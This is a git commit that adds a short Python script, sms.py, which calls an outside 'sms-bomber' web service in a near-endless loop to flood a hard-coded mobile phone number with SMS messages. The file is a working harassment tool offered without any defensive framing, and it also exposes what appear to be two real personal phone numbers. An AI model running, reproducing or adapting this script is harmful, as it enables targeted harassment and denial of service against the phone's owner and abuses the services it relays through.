e09da42b072860496211dfcada79ea8f4c173023
paytmbadshah <57286263+paytmbadshah@users.noreply.github.com>
2021-06-05 10:33:11 +0530

    Create sms.py

---
+++ sms.py
@@ -0,0 +1,17 @@
+import requests
+
+import time
+
+from random import *
+
+mobile_number = "7223889629"
+
+url = "https://freekamall.tech/sms-bomber/1.php?sent=2&&count=100&&mobno=7999187239"
+count=0
+for x in range(99999999999):
+    for i in range(1,34):
+        req = requests.get("https://freekamall.tech/sms-bomber/"+str(i)+".php?sent=2&&count=100&&mobno="+mobile_number)
+        print(f"{str(count)} Time Sended")
+        count=count+1
+        time.sleep(60)
+        
